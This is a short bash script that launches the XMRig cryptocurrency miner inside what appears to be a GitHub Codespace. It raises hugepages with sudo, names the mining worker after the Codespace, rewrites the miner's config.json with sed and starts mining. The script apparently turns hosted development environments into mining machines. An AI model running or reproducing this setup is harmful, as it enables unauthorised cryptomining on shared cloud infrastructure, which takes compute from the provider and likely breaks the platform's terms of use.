#!/bin/bash

# Try to enable hugepages (Codespaces may ignore this silently)
sudo sysctl -w vm.nr_hugepages=4096 || true

# Generate worker name
WORKER="krxXJZV2MW.$CODESPACE_NAME"

# Update config.json
sed -i "s/\"user\": \".*\"/\"user\": \"$WORKER\"/" /workspaces/temp/config.json

# Run XMRig
/home/miner/xmrig/build/xmrig --config /workspaces/temp/config.json
